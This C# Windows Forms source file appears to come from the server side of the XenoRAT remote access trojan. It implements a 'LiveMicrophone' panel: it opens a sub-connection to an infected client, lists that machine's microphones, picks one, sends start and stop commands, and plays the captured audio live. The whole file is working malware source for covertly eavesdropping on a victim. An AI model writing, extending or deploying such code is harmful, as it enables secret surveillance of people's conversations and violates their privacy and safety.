using System;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using NAudio.Wave;

namespace XenoRatServer.Forms
{
    public partial class LiveMicrophone : Form
    {
        private Node client;
        private Node micNode;
        private readonly AudioPlayer player = new AudioPlayer(new WaveFormat(44100, 16, 2));
        private string[] microphones;
        private bool playing = false;

        public LiveMicrophone(Node _client)
        {
            client = _client;
            InitializeComponent();
            client.AddTempOnDisconnect(TempOnDisconnect);
            InitializeAsync();
        }

        private async Task InitializeAsync()
        {
            micNode = await CreateMicNode();
            micNode.AddTempOnDisconnect(TempOnDisconnect);
            await RefreshMicrophones();
            await RecvThread();
        }

        public async Task RecvThread()
        {
            while (micNode.Connected())
            {
                byte[] data = await micNode.ReceiveAsync();
                if (data == null)
                {
                    break;
                }
                if (playing)
                {
                    player.AddAudio(data);
                }
            }
        }

        public void TempOnDisconnect(Node node)
        {
            if (node == client || (node == micNode && micNode != null))
            {
                client?.Disconnect();
                micNode?.Disconnect();
                if (!this.IsDisposed)
                {
                    this.BeginInvoke((MethodInvoker)(() =>
                    {
                        this.Close();
                    }));
                }
            }
        }

        private async Task<Node> CreateMicNode()
        {
            if (micNode != null)
            {
                return micNode;
            }
            await client.SendAsync(new byte[] { 5 });
            Node subSubNode = await client.Parent.CreateSubNodeAsync(2);
            int id = await Utils.SetType2setIdAsync(subSubNode);
            if (id != -1)
            {
                await Utils.Type2returnAsync(subSubNode);
                byte[] a = subSubNode.sock.IntToBytes(id);
                await client.SendAsync(a);
                byte[] found = await client.ReceiveAsync();
                if (found == null || found[0] == 0)
                {
                    subSubNode.Disconnect();
                    return null;
                }
            }
            else
            {
                subSubNode.Disconnect();
                return null;
            }
            return subSubNode;
        }

        public async Task RefreshMicrophones()
        {
            string[] mics = await GetMicrophones();

            comboBox1.Items.Clear();
            comboBox1.Items.AddRange(mics);
            button2.Enabled = mics.Length > 0;
            if (mics.Length > 0)
            {
                await SetMicrophone(0);
            }
        }

        public async Task<string[]> GetMicrophones()
        {
            byte[] opcode = new byte[] { 1 };
            await client.SendAsync(opcode);
            int micsCount = client.sock.BytesToInt(await client.ReceiveAsync());
            string[] result = new string[micsCount];
            for (int i = 0; i < micsCount; i++)
            {
                result[i] = Encoding.UTF8.GetString(await client.ReceiveAsync());
            }
            microphones = result;
            return result;
        }

        public async Task SetMicrophone(int index)
        {
            byte[] opcode = new byte[] { 2 };
            await client.SendAsync(opcode);
            await client.SendAsync(client.sock.IntToBytes(index));
        }

        private async void button2_Click(object sender, EventArgs e)
        {
            button3.Enabled = true;
            button2.Enabled = false; // Start
            button1.Enabled = false;
            player.Start();
            await client.SendAsync(new byte[] { 3 });
            playing = true;
        }

        private async void button3_Click(object sender, EventArgs e)
        {
            button2.Enabled = true;
            button3.Enabled = false; // Stop
            button1.Enabled = true;
            player.Stop();
            await client.SendAsync(new byte[] { 4 });
            playing = false;
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            await RefreshMicrophones();
            // Refresh
        }

        private async void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            int selectedIndex = comboBox1.SelectedIndex;
            if (selectedIndex != -1)
            {
                await SetMicrophone(selectedIndex);
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            player.Dispose();
        }
    }

    class AudioPlayer
    {
        private readonly BufferedWaveProvider waveProvider;
        private readonly WaveOutEvent waveOut;

        public AudioPlayer(WaveFormat waveFormat)
        {
            waveProvider = new BufferedWaveProvider(waveFormat);
            waveOut = new WaveOutEvent();
            waveOut.Init(waveProvider);
        }

        public void Start()
        {
            waveProvider.ClearBuffer();
            waveOut.Play();
        }

        public void Stop()
        {
            waveOut.Stop();
            waveProvider.ClearBuffer();
        }

        public void Dispose()
        {
            Stop();
            waveOut.Dispose();
        }

        public void AddAudio(byte[] audioData)
        {
            waveProvider.AddSamples(audioData, 0, audioData.Length);
        }
    }
}
